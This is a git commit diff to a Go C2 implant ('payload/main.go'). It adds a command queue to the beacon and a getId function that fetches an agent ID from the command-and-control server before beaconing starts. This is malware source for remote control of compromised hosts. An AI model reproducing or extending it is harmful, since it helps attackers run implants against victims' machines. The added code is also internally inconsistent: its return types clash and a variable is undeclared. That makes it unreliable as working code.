0feb9c450c00d434fcdfbd37523e6469ac730689
Sparsh N <sparsh.nair@hotmail.com>
2024-03-30 02:48:26 -0400

    add command queue

--- payload/main.go
+++ payload/main.go
@@ -61,9 +61,37 @@ func main() {
 	instance.Beacon.Jitter = instance.Jitter
 	instance.Beacon.HttpConn = instance.HttpConn
 	instance.Beacon.ReqQueue = &internal.RequestQueue
+	instance.Beacon.CmdQueue = &internal.CmdQueue
 
-	// TODO: Fetch agent Id
+	// Fetch agent Id from C2
+	id, err = getId(instance)
+	if err != nil {
+		log.Fatal(err)
+	}
+	instance.HttpConn.Id = *id
 
 	// Start the beacon
 	instance.Beacon.Start()
+}
+
+func getId(instance *Instance) (string, error) {
+	idReq, err := instance.HttpConn.NewIdRequest()
+	if err != nil {
+		return nil, err
+	}
+	resp, err := instance.HttpConn.SendRequest(idReq)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.Body == nil {
+		return nil, fmt.Errorf("error getting id")
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	ret := string(body)
+	return &ret, nil
 }
